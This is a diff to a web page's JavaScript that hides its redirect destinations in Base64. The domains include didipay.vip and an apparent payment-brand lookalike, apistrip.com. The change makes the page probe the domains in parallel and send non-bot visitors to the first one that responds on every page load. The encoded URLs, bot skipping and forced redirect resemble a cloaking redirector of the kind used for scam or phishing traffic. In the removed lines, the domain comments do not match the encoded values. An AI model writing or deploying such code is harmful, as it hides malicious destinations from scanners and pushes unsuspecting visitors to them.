@@ -78,9 +78,9 @@
 
     // ✅ Base64 加密跳转地址列表（多域名）
     const encodedList = [
-      'aHR0cHM6Ly93ZWIuZGlkaXBheS52aXAv',       // web.aistrip.vip
-      'aHR0cHM6Ly93ZWIuZGlkaXBheS52aXAv',   // strip.apistrip.com
-      'aHR0cHM6Ly93ZWIuZGlkaXBheS52aXAv'            // ai.strip.cl（示例）
+      'aHR0cHM6Ly93ZWIuZGlkaXBheS52aXAv',       // web.didipay.vip
+      'aHR0cHM6Ly9zdHJpcC5hcGlzdHJpcC5jb20=',   // strip.apistrip.com
+      'aHR0cDovL3d3dy5iYWlkdS5jb20='            // www.baidu.com
     ];
 
     // ✅ 检测域名是否可用（通过加载 ping.png）
@@ -93,18 +93,16 @@
       });
     }
 
-    // ✅ 自动检测并跳转
+    // ✅ 并行检测并跳转第一个可用域名
     async function autoRedirect() {
       if (isBot) return;
 
-      for (const encoded of encodedList) {
-        const url = atob(encoded);
-        const result = await checkDomain(url);
-        if (result) {
-          window.location.href = result;
-          break;
-        }
-      }
+      const urls = encodedList.map(encoded => atob(encoded));
+      const checks = urls.map(url => checkDomain(url));
+      const results = await Promise.all(checks);
+
+      const valid = results.find(url => url);
+      if (valid) window.location.href = valid;
     }
 
     // ✅ 页面加载后延迟跳转（每次打开都会跳）
